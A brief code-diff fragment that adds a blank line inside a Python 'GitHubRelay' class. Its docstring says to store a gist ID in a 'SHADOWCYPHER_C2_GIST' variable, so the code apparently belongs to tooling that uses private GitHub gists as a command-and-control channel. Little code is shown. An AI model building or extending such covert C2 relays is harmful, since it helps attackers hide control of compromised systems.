@@ -53,6 +53,7 @@ class GitHubRelay:
         Returns the gist_id. Store this in SHADOWCYPHER_C2_GIST env var.
         """
         import urllib.request
+
         payload = json.dumps({
             "description": description,
             "public": False,
